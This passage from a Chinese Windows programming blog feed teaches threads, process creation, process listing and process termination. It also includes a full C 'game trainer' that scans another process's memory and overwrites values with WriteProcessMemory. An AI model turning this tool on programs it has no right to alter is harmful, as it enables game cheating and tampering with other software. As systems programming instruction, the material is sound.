0;}DWORD WINAPI ThreadPro(LPVOID lpParam){    for(int i = 0; i &lt; 4; i++) //循环打印4次    {    printf("world\n");    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建线程-2"><a href="#创建线程-2" class="headerlink" title="创建线程-2"></a>创建线程-2</h2><p>它不是微软官方提供的，在原先的API<code>CreateThread</code>上进行了一层包装，为了保证它的通用性</p><p>推荐使用这个</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;process.h&gt;unsigned int _beginthreadex(    void *_Security, //线程安全属性    unsigned _StackSize, //线程堆栈大小    unsigned (*_beginthreadex_proc_type)(void*) _StartAddress, //线程函数地址    void *_ArgList, //线程函数参数    unsigned _InitFlag, //指定线程是否立即启动    unsigned *_ThrdAddr //存储线程ID号)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><pre class="line-numbers language-none"><code class="language-none">BOOL SetThreadPriority(HANDLE hThread, int nPriority);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319856.png" alt="image-20211123224705881"></p><ul><li><p>优先级号0（最低）-31（最高）。 </p></li><li><p>调度方式—高优先级优先调度，同优先级机会均等</p></li></ul><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261319365.png" alt="image-20211123224851297"></p><h2 id="线程终止"><a href="#线程终止" class="headerlink" title="线程终止"></a>线程终止</h2><ul><li><p>线程函数自然退出。（推荐） </p></li><li><p>使用ExitThread函数终止线程。（自身终止） </p></li><li><p>使用TerminateThread函数终止线程。（A终止B） </p></li><li><p>使用ExitProcess结束线程所在进程。（进程退出）</p></li></ul><p>线程正常终止时会发生下列事件： </p><ul><li><p>线程中所有对象用各自的析构函数销毁。 </p></li><li><p>该线程使用的堆栈被释放。 </p></li><li><p>系统将Exit Code设置为线程函数返回值。 </p></li><li><p>递减内核对象中的Usage Code的值</p></li></ul><p>如果我们暴力终止线程：</p><ul><li>对象无法使用析构函数</li><li>堆栈无法被释放，造成内存泄露</li></ul><p>当前线程终止其他线程</p><pre class="line-numbers language-none"><code class="language-none">HANDLE TerminateThread(    HANDLE hThread, //目标线程句柄    DWORD dwExitCode //退出代码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>终止当前线程</p><pre class="line-numbers language-none"><code class="language-none">HANDLE ExitThread(    DWORD dwExitCode //退出代码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>终止当前线程-2</p><p>推荐使用这个</p><pre class="line-numbers language-none"><code class="language-none">void _endthreadex(    unsigned retcode //退出码)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="废弃函数"><a href="#废弃函数" class="headerlink" title="废弃函数"></a>废弃函数</h2><pre class="line-numbers language-none"><code class="language-none">void _beginthread( _beginthread_proc_type _StartAddress,    unsigned _StackSize,    void* _ArgList)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">void _endthread(void<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-基础篇(一) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程-实战篇</title>
      <link href="/2021/10/28/jin-cheng-shi-zhan-pian/"/>
      <url>/2021/10/28/jin-cheng-shi-zhan-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="自制游戏修改器"><a href="#自制游戏修改器" class="headerlink" title="自制游戏修改器"></a>自制游戏修改器</h1><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><p>整个游戏内存为800的地址</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316388.png" alt="image-20211122210601405"></p><p>然后买个弹夹 钱变成了780</p><p>找内存为780的地址</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316804.png" alt="image-20211122210631726"></p><p>修改内存</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316641.png" alt="image-20211122210741502"></p><p>主板和内存配合工作</p><p>内存：存储数据</p><p>主板(CPU)：对数据进行处理</p><p>两者通过总线进行连接</p><p>总线传输只有0和1两种信号</p><p>1根总线：2种信号</p><p>2根总线：4种信号</p><p>32根总线：2的32次种信号</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316259.png" alt="image-20211122211053995"></p><h2 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316086.png" alt="image-20211122211424503"></p><h2 id="虚拟内存-amp-物理内存"><a href="#虚拟内存-amp-物理内存" class="headerlink" title="虚拟内存 &amp; 物理内存"></a>虚拟内存 &amp; 物理内存</h2><p>通过MMU进行映射，两者时动态的映射关系</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316116.png" alt="image-20211122211508148"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316481.png" alt="image-20211122211617913"></p><h2 id="寻址能力"><a href="#寻址能力" class="headerlink" title="寻址能力"></a>寻址能力</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316373.png" alt="image-20211122211741556"></p><h2 id="进程的虚拟内存空间-重要"><a href="#进程的虚拟内存空间-重要" class="headerlink" title="进程的虚拟内存空间(重要)"></a>进程的虚拟内存空间(重要)</h2><p>我们能用的 就只有用户程序区</p><p>范围：</p><pre class="line-numbers language-none"><code class="language-none">0X00010000~0X7FFEFFFF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316349.png" alt="image-20211122211904814"></p><p>64KNULL指针区：鉴别空指针机制</p><p>64K禁区：隔离用户程序区和2G内核区</p><p>为什么都是64K大小，是因为分配粒度最小就是64K</p><h2 id="两个重要的API"><a href="#两个重要的API" class="headerlink" title="两个重要的API"></a>两个重要的API</h2><ul><li><p>ReadProcessMemory：读取进程内存</p></li><li><p>WriteProcessMemory：写入进程内存</p></li></ul><h2 id="主要思路"><a href="#主要思路" class="headerlink" title="主要思路"></a>主要思路</h2><pre class="line-numbers language-none"><code class="language-none">1.列出现有进程2.指定进程并修改该进程目标内存3.杀死指定进程4.退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实操代码"><a href="#实操代码" class="headerlink" title="实操代码"></a>实操代码</h2><pre class="line-numbers language-none"><code class="language-none">/*功能说明：1. 列出现有进程。2. 指定进程并修改该进程目标内存。1)打开进程，获取内核对象句柄。2)查找首轮目标。3)列出查找结果。4)结果大于1时，查找二轮目标。5)修改二轮目标中所有内存的值。3. 杀死指定进程。4. 退出。*/#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;TlHelp32.h&gt;//定义常量1Kconst DWORD KONEK = 1024;//定义常量1页const DWORD KPAGE = 4 * KONEK;//定义常量1Gconst DWORD KONEG = KONEK * KONEK * KONEK;void ShowMenu();void ShowProcessList();void EditProcessData();void KillProcess();//dwValue:要寻找的值//pAddrList数组指针:存放第一轮搜索的数据//pAddrListCounter:计数器//addrListMax:最大值,越界判断void FirstRound(HANDLE hProcess, DWORD dwValue, DWORD* pAddrList, DWORD* pAddrListCounter, const DWORD addrListMax);BOOL CompareOnePage(HANDLE hProcess, DWORD dwBaseAddr, DWORD dwValue, DWORD* pAddrList, DWORD* pAddrListCounter, const DWORD addrListMax);void ShowAddrList(DWORD* pDwAddrList, DWORD dwAddrCount);void SecondRound(HANDLE hProcess, DWORD dwValue, DWORD* pAddrList, DWORD dwAddrListCounter, DWORD* pTargetList, DWORD* pTargetCounter);int main(void){int select = 0;while (true){//显示菜单ShowMenu();while (!scanf_s("%d", &amp;select)){// 清空键盘缓冲区rewind(stdin);printf("please input your choice...");}switch (select){case 1:ShowProcessList();break;case 2:EditProcessData();break;case 3:KillProcess();break;case 4:printf("Thank your using ...\n");system("pause");return 0;default:printf("Please select again 1-4...\n");}}return 0;}//展示菜单void ShowMenu(){printf("\n--------------------------\n");printf("Menu:\n");//t是加入Tab键printf("\t1.Show system process list.\n");printf("\t2.Input process id which you want to edit.\n");printf("\t3.Input process id which you want to kill.\n");printf("\t4.Exit\n");printf("--------------------------\n");}//列出进程void ShowProcessList(){PROCESSENTRY32 pc;pc.dwSize = sizeof(pc);//给当前进程拍摄快照HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);BOOL bMore = Process32First(hProcessSnap, &amp;pc);while (bMore){printf("\n-------------------\n");printf("%d\n", pc.th32ProcessID);wprintf(L"%s\n", pc.szExeFile);bMore = Process32Next(hProcessSnap, &amp;pc);}CloseHandle(hProcessSnap);}void EditProcessData(){DWORD dwId = 0;DWORD dwSearchValue = 0;DWORD dwAddrList[4 * KONEK] = { 0 };DWORD dwAddrCount = 0;BOOL bRet = FALSE;printf("please input process id which you want to edit:");while (!scanf_s("%u", &amp;dwId)){rewind(stdin);printf("please input again:");}//printf("\nprocess id = %u\n", dwId);HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);if (NULL == hProcess){printf("Open process failed...\n");return;}else{printf("Open process success...\n");system("pause");printf("Please input the value which you want search first round:");scanf_s("%u", &amp;dwSearchValue);//首轮查找FirstRound(hProcess, dwSearchValue, dwAddrList, &amp;dwAddrCount, 4 * KONEK);//显示查找到的内容ShowAddrList(dwAddrList, dwAddrCount);//判断找到的数据个数if (dwAddrCount == 0){return;}else if (dwAddrCount == 1){DWORD value;printf("input the value which you want to set");scanf_s("%u", &amp;value);//修改内存bRet = WriteProcessMemory(hProcess, (LPVOID)dwAddrList[0], (LPCVOID)&amp;value, sizeof(DWORD), NULL);if (bRet){printf("Edit Success!!!\n");}else{printf("Edit failed!!!\n");}}else{DWORD dwSecondRoundSearchValue = 0;DWORD dwTargetList[KONEK] = { 0 };DWORD dwTargetCounter = 0;printf("input the value which you need second round find:");//重新接收一个值scanf_s("%u", &amp;dwSecondRoundSearchValue);//找到的值的个数超过1个//二轮搜索SecondRound(hProcess, dwSecondRoundSearchValue, dwAddrList, dwAddrCount, dwTargetList, &amp;dwTargetCounter);ShowAddrList(dwTargetList, dwTargetCounter);DWORD value;printf("input the value which you want to set");scanf_s("%u", &amp;value);for (DWORD i = 0; i &lt; dwTargetCounter; i++){//修改内存bRet = WriteProcessMemory(hProcess, (LPVOID)dwTargetList[i], &amp;value, sizeof(value), NULL);if (bRet){printf("Edit Success!!!\n");}else{printf("Edit failed!!!\n");}}}}CloseHandle(hProcess);}//杀死指定进程void KillProcess(){BOOL bRet = FALSE;DWORD dwId = 0;printf("Please input process id while you want to kill...\n");while (!scanf_s("%u", &amp;dwId)){rewind(stdin);printf("please input process id while you want to kill");}HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);if (hProcess != NULL){bRet = TerminateProcess(hProcess, 0);}CloseHandle(hProcess);if (bRet){printf("kill process success\n");}else{printf("kill process failed\n");}}//关键点//分页:4K,应该一页一页的去找//2G内存中,64KNULL指针区、64K禁区是不能用的//范围:0X00010000~0X7FFEFFFFvoid FirstRound(HANDLE hProcess, DWORD dwValue, DWORD* pAddrList, DWORD* pAddrListCounter, const DWORD addrListMax){//定义开始的基地址DWORD dwBaseAddr = 64 * KONEK;//计算用户程序区总页数//(2G内存 - 64KNULL指针区 - 64K禁区)4K //因为一页是4KDWORD dwPageCount = (2 * KONEG - 64 * KONEK * 2) / KPAGE;printf("%u pages\n", dwPageCount);printf("Start searching ...\n");DWORD dwBeginAddr = dwBaseAddr;for (; dwBaseAddr &lt; 2 * KONEG - 64 * KONEK; dwBaseAddr += KPAGE){//一页一页的比较if (!CompareOnePage(hProcess, dwBaseAddr, dwValue, pAddrList, pAddrListCounter, addrListMax)){return;}//计算进度百分比DWORD page = (dwBaseAddr - dwBeginAddr) / KPAGE + 1;printf("current is %u page\n", page);double temp = ((double)page / dwPageCount) * 100;printf("-----%%%f------\n", temp);}printf("\nSearch finished...\n");system("pause");}BOOL CompareOnePage(HANDLE hProcess, DWORD dwBaseAddr, DWORD dwValue, DWORD* pAddrList, DWORD* pAddrListCounter, const DWORD addrListMax){BYTE byPage[KPAGE] = { 0 };//读取每一页的内容if (!ReadProcessMemory(hProcess, (LPCVOID)dwBaseAddr, (LPVOID)byPage, KPAGE, NULL)){printf("Read Memory error!!!\n");return TRUE;}DWORD* pdwPointer = NULL;pdwPointer = (DWORD*)byPage;for (DWORD i = 0; i &lt; KONEK; i++){//判断越界if (*pAddrListCounter &gt;= addrListMax){printf("Too many data, can not save...\n");return FALSE;}//计数器++if (pdwPointer[i] == dwValue){pAddrList[*pAddrListCounter] = dwBaseAddr + i * sizeof(DWORD);(*pAddrListCounter)++;}}return TRUE;}void ShowAddrList(DWORD* pDwAddrList, DWORD dwAddrCount){printf("\n----------Address list begin----------\n");for (DWORD i = 0; i &lt; dwAddrCount; i++){printf("%X\n", pDwAddrList[i]);}printf("\n----------Address list end------------\n");}void SecondRound(HANDLE hProcess, DWORD dwValue, DWORD* pAddrList, DWORD dwAddrListCounter, DWORD* pTargetList, DWORD* pTargetCounter){DWORD dwTemp = 0;for (DWORD i = 0; i &lt; dwAddrListCounter; i++){if (ReadProcessMemory(hProcess, (LPCVOID)pAddrList[i], &amp;dwTemp, sizeof(dwTemp), NULL)){//计数器++if (dwTemp == dwValue){pTargetList[*pTargetCounter] = pAddrList[i];(*pTargetCounter)++;}}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程-实战篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程-编码篇</title>
      <link href="/2021/10/28/jin-cheng-bian-ma-pian/"/>
      <url>/2021/10/28/jin-cheng-bian-ma-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="获取系统信息"><a href="#获取系统信息" class="headerlink" title="获取系统信息"></a>获取系统信息</h2><p>先看OSVERSIONINFO</p><p>参考msdn：<a href="https://docs.microsoft.com/en-us/previous-versions/aa915064(v=msdn.10)">https://docs.microsoft.com/en-us/previous-versions/aa915064(v=msdn.10)</a></p><pre class="line-numbers language-none"><code class="language-none">typedef struct _OSVERSIONINFO{  //当前结构体的大小  DWORD dwOSVersionInfoSize;  //主版本号  DWORD dwMajorVersion;  //次版本号  DWORD dwMinorVersion;  //编译版本号  DWORD dwBuildNumber;  //平台Id  DWORD dwPlatformId;  TCHAR szCSDVersion[128];} OSVERSIONINFO;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>针对这个参数：dwPlatformId 就是平台Id 进行判断系统信息</p><p>它会返回WIN32(Windows98之前)和WIN32_NT(Windows98之后)</p><p>具体的宏定义</p><pre class="line-numbers language-none"><code class="language-none">#define VER_PLATFORM_WIN32s             0#define VER_PLATFORM_WIN32_WINDOWS      1#define VER_PLATFORM_WIN32_NT           2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316836.png" alt="image-20211122120240769"></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void){    OSVERSIONINFO vs = { sizeof(vs) };    GetVersionEx(&amp;vs);    if (vs.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)    {        printf("This is windows 98...\n");    }    else if (vs.dwPlatformId == VER_PLATFORM_WIN32_NT)    {        printf("This is windows NT...\n");    }    system("pause");    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261316929.png" alt="image-20211122121051255"></p><p>针对其他参数</p><p>用case-switch 进行判断即可</p><p>使用OSVERSIONINFO的扩展APIOSVERSIONINFOEX</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317792.png" alt="image-20211122121725281"></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;#ifndef SM_SERVERR2# define SM_SERVERR2 89#endif#ifndef VER_SUITE_STORAGE_SERVER# define VER_SUITE_STORAGE_SERVER 0x00002000#endif#ifndef VER_SUITE_COMPUTE_SERVER# define VER_SUITE_COMPUTE_SERVER 0x00004000#endifstring GetSystemName(){SYSTEM_INFO info;GetSystemInfo(&amp;info);OSVERSIONINFOEX os;os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);if (GetVersionEx((OSVERSIONINFO *)&amp;os)){string vname;switch (os.dwMajorVersion) {case 4:switch (os.dwMinorVersion) {case 0:if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)vname = "Windows NT 4.0";else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)vname = "Windows 95";break;case 10:vname = "Windows 98";break;case 90:vname = "Windows Me";break;}break;case 5:switch (os.dwMinorVersion) {case 0:vname = "Windows 2000";break;case 1:vname = "Windows XP";break;case 2:if (os.wProductType == VER_NT_WORKSTATION &amp;&amp; \info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)vname = "Windows XP Professional x64 Edition";else if (GetSystemMetrics(SM_SERVERR2) == 0)vname = "Windows Server 2003";else if (GetSystemMetrics(SM_SERVERR2) != 0)vname = "Windows Server 2003 R2";break;}break;case 6:switch (os.dwMinorVersion) {case 0:if (os.wProductType == VER_NT_WORKSTATION)vname = "Windows Vista";elsevname = "Windows Server 2008";break;case 1:if (os.wProductType == VER_NT_WORKSTATION)vname = "Windows 7";elsevname = "Windows Server 2008 R2";break;case 2:if (os.wProductType == VER_NT_WORKSTATION)vname = "Windows 8";elsevname = "Windows Server 2012";break;case 3:if (os.wProductType == VER_NT_WORKSTATION)vname = "Windows 8.1";elsevname = "Windows Server 2012 R2";break;}break;case 10:default:vname = "unknow os";}return vname;}elsereturn "GetVersionEx failed";}int main(void){cout &lt;&lt; GetSystemName() &lt;&lt; endl;system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317094.png" alt="image-20211122122117457"></p><h2 id="创建进程控制台"><a href="#创建进程控制台" class="headerlink" title="创建进程控制台"></a>创建进程控制台</h2><p>使用CreatProcess</p><p>这里注意：启动程序也可以写到第一个参数中，但是</p><pre class="line-numbers language-none"><code class="language-none">1.不能带参数2.要写绝对路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>当第一个参数和第二个参数都有值时，优先第一个参数</p><p><strong>建议放到第二个参数中</strong></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;//创建新的控制台int main(void){int ret = 0;//定义两个对象STARTUPINFO si;PROCESS_INFORMATION pi;//si内存置0ZeroMemory(&amp;si, sizeof(si));//si的第一个分量要拿到当前si结构体的大小si.cb = sizeof(si);//窗口的个性设置si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = TRUE;////pi内存置0ZeroMemory(&amp;pi, sizeof(pi));////创建一个数组,因为第二个参数是一个宽字符集的指针,不能是一个定指针WCHAR commandline[] = L"cmd";//WCHAR commandline1[] = L"C:/Windows/System32/calc.exe";ret = CreateProcess(NULL, commandline, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);//ret = CreateProcess(commandline1, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi);//判断返回值if (ret){//关闭线程CloseHandle(pi.hThread);//关闭进程CloseHandle(pi.hProcess);printf("threadid = %d\n", pi.dwThreadId);printf("processid = %d\n", pi.dwProcessId);}else{printf("启动失败");}system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317314.png" alt="image-20211122161452894"></p><h2 id="进程查看器"><a href="#进程查看器" class="headerlink" title="进程查看器"></a>进程查看器</h2><pre class="line-numbers language-none"><code class="language-none">//进程查看器//write by yuanchunxu#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;TlHelp32.h&gt;int main(){PROCESSENTRY32 pc;//pc的第一个分量要有大小pc.dwSize = sizeof(pc);//给当前进程拍摄快照//0时进程IdHANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//判断是否合法if (INVALID_HANDLE_VALUE == hProcessSnap){printf("get snapshop failed\n");system("pause");return 0;}//取第一个进程的信息BOOL bMore = Process32First(hProcessSnap, &amp;pc);//循环打印进程while (bMore){printf("\n---------------------------\n");printf("id:%d\n", pc.th32ProcessID);//宽字符打印Unicode字符集wprintf(L"name:%s\n", pc.szExeFile);//取下一个进程的信息bMore = Process32Next(hProcessSnap, &amp;pc);}//关闭快照的句柄CloseHandle(hProcessSnap);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317050.png" alt="image-20211122192407899"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317132.png" alt="image-20211122193348154"></p><h2 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h2><pre class="line-numbers language-none"><code class="language-none">//进程查看器/结束进程//write by yuanchunxu#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;TlHelp32.h&gt;BOOL CloseProcess(DWORD dwId){BOOL bRet;//打开结束的那个进程HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);if (hHandle != NULL){//结束进程bRet = TerminateProcess(hHandle, 0);}//关闭句柄CloseHandle(hHandle);return bRet;}int main(){PROCESSENTRY32 pc;pc.dwSize = sizeof(pc);HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);if (INVALID_HANDLE_VALUE == hProcessSnap){printf("get snapshop failed\n");system("pause");return 0;}BOOL bMore = Process32First(hProcessSnap, &amp;pc);while (bMore){printf("\n---------------------------\n");printf("id:%d\n", pc.th32ProcessID);wprintf(L"name:%s\n", pc.szExeFile);bMore = Process32Next(hProcessSnap, &amp;pc);}CloseHandle(hProcessSnap);printf("\n-------------------------\n");int pid = 0;printf("请输入要关闭的进程Id\n");//接收传入关闭进程的Idscanf("%d", &amp;pid);CloseProcess(pid);system("pause");return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317719.png" alt="image-20211122194942397"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317981.png" alt="image-20211122195102298"></p>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程-编码篇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程-基础篇</title>
      <link href="/2021/10/28/jin-cheng-ji-chu-pian/"/>
      <url>/2021/10/28/jin-cheng-ji-chu-pian/</url>
      
